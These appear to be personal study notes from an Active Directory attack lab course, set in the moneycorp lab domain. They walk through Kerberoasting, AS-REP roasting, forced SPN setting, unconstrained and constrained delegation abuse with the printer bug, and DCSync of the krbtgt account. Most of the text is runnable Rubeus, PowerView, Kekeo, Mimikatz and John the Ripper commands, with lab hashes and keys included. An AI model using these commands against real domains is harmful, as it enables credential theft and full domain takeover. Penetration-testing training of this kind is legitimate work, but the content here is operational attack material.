**Let think of scenario's where there where no service or paths, how can we escalate privileges in an active directory environment, what are other opportunities/ways we can go about it ??**

# **Kerberoast (More Effective)**


![](https://i.imgur.com/ruStWfi.png)



- Offline cracking of service account passwords.
- The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
- Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack!


**_Example -:_**


- Find user accounts used as Service accounts


```powershell
# AD Module

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerView

Get-DomainUser -SPN
```

> **Hint :** When you run `klist`, the SPN can be identified as the name of the {service/machine name}


![](https://i.imgur.com/S7sx0zM.png)


**_Capturing Hashes :_**


- Use Rubeus to list Kerberoast stats


```powershell
Rubeus.exe kerberoast /stats
```


- Use Rubeus to request a TGS (This is a must run)


```powershell
Rubeus.exe kerberoast /user:svcadmin /simple 
```


- To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC (Also must run)

```powershell
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
```

- Kerberoast all possible accounts

```powershell
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```


> **Note -:** You don't need invisi-shell while running `rubeus` here, it won't be stable, also the options with **must run**, must be ran as one might provide an hash and the other might not, depending on system configuration



**_Cracking Hashes :_**


- Crack ticket using John the Ripper


```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-
worst-pass.txt C:\AD\Tools\hashes.txt
```


# **Learning Objective 14**

- Using the Kerberoast attack, crack password of a SQL server service account.


## **Solution**


**_Coming Soon_**



# **Targeted Kerberoasting - AS-REPs**


- If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
- With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.



![](https://i.imgur.com/MITSHLg.png)


**_Example -:_**


- Enumerating accounts with Kerberos Preauth disabled

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired -Verbose

# AD module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```


- Force disable Kerberos Preauth
- Let's enumerate the permissions for RDPUsers on ACLs using `PowerView`:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose

Get-DomainUser -PreauthNotRequired -Verbose
```



- Request encrypted AS-REP for offline brute-force.
- Let's use `ASREPRoast`


```powershell
Get-ASREPHash -UserName VPN1user -Verbose
```


- To enumerate all users with Kerberos preauth disabled and request a hash


```powershell
Invoke-ASREPRoast -Verbose
```


- We can use John The Ripper to brute-force the hashes offline

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-
pass.txt C:\AD\Tools\asrephashes.txt
```



# **Targeted Kerberoasting - Set SPN**

- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
- We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".

**_Example :_**

- Let's enumerate the permissions for **RDPUsers** on ACLs using `PowerView`:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

- See if the user already has a SPN:


```powershell
# Powerview
Get-DomainUser -Identity supportuser | select serviceprincipalname

# AD module
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```


- Set a SPN for the user (must be unique for the forest)

```powershell
# Powerview
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}

# AD module
Set-ADUser -Identity support1user -ServicePrincipalNames
@{Add=‘dcorp/whatever1'}
```



- Kerberoast the user



```powershell
Rubeus.exe kerberoast /outfile:targetedhashes.txt john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```




# **Kerberos Delegation**


- A user provides credentials to the Domain Controller.
- The DC returns a TGT.
- The user requests a TGS for the web service on Web Server.
- The DC provides a TGS.
- The user sends the TGT and TGS to the web server.
- The web server service account use the user's TGT to request a TGS for the database server from the DC.
- The web server service account connects to the database server as the user.


**_Examples -:_**


- Discover domain computers which have unconstrained delegation enabled :


```powershell
# Powerview
Get-DomainComputer -UnConstrained

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True
```



- Compromise the server(s) where Unconstrained delegation is enabled.
- We must trick or wait for a domain admin to connect a service on appsrv.
- Now, if the command is run again:


```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```


- The DA token could be reused:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```


# **Unconstrained Delegation - Printer Bug**


- We can capture the TGT of dcorp-dc$ by using `Rubeus` on **dcorp-appsrv**:


```powershell
Rubeus.exe monitor /interval:5 /nowrap
```


- And after that run `MS-RPRN.exe` - (https://github.com/leechristensen/SpoolSample) - on the student VM:


```powershell
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

***

- If you are attacking from a Linux machine, check out Coercer - (https://github.com/p0dalirius/Coercer) - for other MS protocols that can be abused for coercion.

***

- Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:


```powershell
Rubeus.exe ptt /tikcet:
```


- Once the ticket is injected, run `DCSync`:


```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```



# **Learning Objective 15**


- Find a server in dcorp domain where Unconstrained Delegation is enabled.
- Compromise the server and escalate to Domain Admin privileges.
- Escalate to Enterprise Admins privileges by abusing Printer Bug!


## **Solution**



**_Coming Soon_**



# **Constrained Delegation**


- To abuse constrained delegation, we need to have access to the `websvc` account. If we have access to that account, it is possible to access the services listed in **msDS-AllowedToDelegateTo** of the `websvc` account as ANY user. The service account must also have the (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D) `UserAccountControl` attribute


![](https://i.imgur.com/ezTsNOd.png)



**_Example_**



- Enumerate users and computers with constrained delegation enabled


```powershell
# PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```



![](https://i.imgur.com/c767LzL.png)


## **Abusing with Kekeo**


- Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc's hash from dcorp-adminsrv
- Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):



```powershell
kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
```



- Using s4u from Kekeo, we request a TGS (steps 4 & 5):



```powershell
tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```


- Using mimikatz, inject the ticket (Step 6):


```powershell
Invoke-Mimikatz -Command '"kerberos::ptt
TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.
MONEYCORP.LOCAL_cifs~dcorp-
mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LO
CAL.kirbi"'
```


- you can now run command on remote system ( **msDS-AllowedToDelegateTo**)


```
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```




## **Abusing with Rubeus**



- We can use the following command (We are requesting a TGT and TGS in a single command):



```powershell
Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
```


- you can now run command on remote system ( **msDS-AllowedToDelegateTo**)



```powershell
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```


## **Constrained Delegation - Service Abuse**

- Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified. 
- This is huge as it allows access to many interesting services when the delegation may be for a non-intrusive service!




- Enumerate users and computers with constrained delegation enabled


```powershell
# PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```


![](https://i.imgur.com/3ymZaqa.png)



- Abusing with `Rubeus`


- We can use the following command (We are requesting a TGT and TGS in a single command):


```powershell
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```

- After injection, we can run `DCSync`:


```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```



# **Learning Objective 16**



- [ ] Enumerate users in the domain for whom Constrained Delegation is enabled.
	- For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
	- Pass the ticket and access the service as DA.
- [ ] Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
	- For such a user, request a TGT from the DC.
	- Use the TGS for executing the DCSync attack.


## **Solution**


**_Coming Soon_**



# **Resource-based Constrained Delegation**


- To abuse RBCD in the most effective form, we just need two privileges.

	1. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.
	2. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS-MachineAccountQuota is 10 for all domain users)
	3. We already have admin privileges on student VMs that are domain joined machines.
	4. Enumeration would show that the user **'ciadmin'** has Write permissions over the dcorp-mgmt machine!

```powershell
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```


